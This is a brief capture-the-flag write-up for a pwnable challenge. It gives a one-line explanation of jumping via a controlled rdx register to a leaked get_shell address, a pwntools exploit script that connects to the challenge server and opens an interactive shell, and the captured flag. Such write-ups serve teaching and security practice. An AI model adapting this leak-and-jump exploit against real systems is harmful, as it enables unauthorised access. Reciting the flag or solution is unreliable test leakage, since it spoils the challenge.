# Wanna Play a Game?

`Pwnable`

`We can jump any address with our rdx. So leak the address of get_shell, and go to that address.`

```
from pwn import *
e = ELF('chall')
HOST = 'fe34abc77b40214b09648640e2a19860.chal.ctf.ae'
p = remote(HOST, 443, ssl=True, sni=HOST)
p.sendafter(b'Name> ', p64(e.sym['printf']))
p.sendafter(b'> ', str(7*2+1).encode())
p.sendafter(b'> ', str(0x404060).encode())
passcode = p.recv(8)
www = int.from_bytes(passcode,'little')
p.sendafter(b'> ', b'2')
p.sendafter(b'> ', str(www).encode())
p.interactive()
```

flag is: **flag{8tdGUPB6sf21lsM3S5f3tB4ymV9NLRGJ}**
